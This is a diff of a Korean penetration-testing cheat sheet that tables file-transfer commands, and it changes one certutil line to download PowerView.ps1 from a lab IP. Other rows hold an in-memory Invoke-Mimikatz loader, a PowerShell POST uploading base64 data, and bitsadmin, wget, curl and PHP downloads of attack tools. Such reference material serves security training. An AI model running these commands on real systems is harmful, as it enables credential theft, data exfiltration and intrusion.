@@ -6,7 +6,7 @@
 | `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`                              | PowerShell을 사용하여 메모리에서 파일 실행           |
 | `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`                                            | PowerShell을 사용하여 파일 업로드                |
 | `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe`                                                   | Bitsadmin을 사용하여 파일 다운로드                |
-| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`                                                      | Certutil을 사용하여 파일 다운로드                 |
+| certutil.exe -urlcache -split -f http://10.10.14.48:8888/PowerView.ps1                                             | Certutil을 사용하여 파일 다운로드                 |
 | `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`                   | Wget을 사용하여 파일 다운로드                     |
 | `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`                   | cURL을 사용하여 파일 다운로드                     |
 | `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`          | PHP를 사용하여 파일 다운로드                      |
